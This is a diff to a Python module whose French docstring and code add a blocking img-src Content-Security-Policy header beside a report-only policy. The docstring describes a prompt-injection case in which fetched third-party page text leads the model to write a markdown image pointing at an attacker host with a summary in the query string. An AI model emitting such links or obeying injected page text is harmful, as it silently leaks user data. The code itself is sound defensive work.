@@ -7,12 +7,27 @@ limite cette EXFILTRATION VERS L'EXTÉRIEUR, et rien d'autre : un composant sur
 la même origine garde le token et l'accès aux endpoints locaux (l'étude le
 dit ; seule une iframe sandboxée couvre ce cas).
 
-**Report-Only, et il doit le rester tant qu'Ilyann n'a pas tranché** (décision
-du 2026-09-26) : une semaine d'usage réel d'abord, puis lecture du journal.
-Rien n'est bloqué ; le navigateur signale seulement ce qu'une politique
-bloquante aurait refusé. Si le journal montre qu'une fonction légitime serait
-cassée (Vite en dev, KaTeX, images générées, ComfyUI, Monaco), on le RAPPORTE
-— on n'élargit pas la politique à l'aveugle pour faire taire le journal.
+**Report-Only pour la politique complète** (décision du 2026-09-26) : une
+semaine d'usage réel d'abord, puis lecture du journal. Le navigateur signale
+seulement ce qu'une politique bloquante aurait refusé. Si le journal montre
+qu'une fonction légitime serait cassée (Vite en dev, KaTeX, images générées,
+ComfyUI, Monaco), on le RAPPORTE — on n'élargit pas la politique à l'aveugle
+pour faire taire le journal.
+
+**Exception : ``img-src`` est BLOQUANT** (décision d'Ilyann du 2026-10-18,
+PR #66), via un second en-tête ``Content-Security-Policy`` réduit à cette
+seule directive (:func:`politique_bloquante`). Déclencheur : la lecture
+directe d'URL injecte dans le prompt le texte d'une page écrite par un tiers,
+qui peut faire écrire au modèle ``![](https://attaquant/?q=<résumé>)`` — une
+``<img>`` se charge sans clic. Le filtrage par liste côté rendu
+(``ImagesAutoriseesContext``) reste en place comme seconde couche ; la CSP
+couvre en plus ce que ce filtrage ne voit pas (composant de module, tout tour
+sans lecture d'URL). Vérifié avant de basculer : toutes les images
+légitimes de l'interface passent par ``blob:`` (module image, aperçus), aucun
+module du catalogue ne pose d'``<img>`` distante. Le journal était vide (ou
+absent) à cette date, donc n'apportait aucune preuve dans un sens ni dans
+l'autre — un blocage d'image légitime remontera dans ce même journal
+(``report-uri`` est aussi posé sur l'en-tête bloquant).
 
 Une seule définition des directives, ici. Deux consommateurs :
 
@@ -74,9 +89,26 @@ def politique(origines_backend: tuple[str, ...] = (), rapport: str = CHEMIN_RAPP
     return "; ".join(parties)
 
 
+#: Directives BLOQUANTES (en-tête ``Content-Security-Policy``) — sous-ensemble
+#: de :data:`DIRECTIVES`, cf. la docstring du module pour la décision. Même
+#: ``img-src`` que la politique d'observation : les deux ne doivent pas
+#: diverger, sinon le journal parlerait d'une politique qui n'est pas celle
+#: appliquée.
+DIRECTIVES_BLOQUANTES = ("img-src 'self' data: blob:",)
+assert all(d in DIRECTIVES for d in DIRECTIVES_BLOQUANTES)
+
+
+def politique_bloquante(rapport: str = CHEMIN_RAPPORT) -> str:
+    """Valeur de ``Content-Security-Policy`` (bloquant) : ``img-src`` seul."""
+    return "; ".join([*DIRECTIVES_BLOQUANTES, f"report-uri {rapport}"])
+
+
 def entetes(rapport: str = CHEMIN_RAPPORT) -> dict[str, str]:
     """En-têtes posés sur ``index.html`` servi par le backend (même origine)."""
-    return {"Content-Security-Policy-Report-Only": politique(rapport=rapport)}
+    return {
+        "Content-Security-Policy-Report-Only": politique(rapport=rapport),
+        "Content-Security-Policy": politique_bloquante(rapport=rapport),
+    }
 
 
 def _journal():
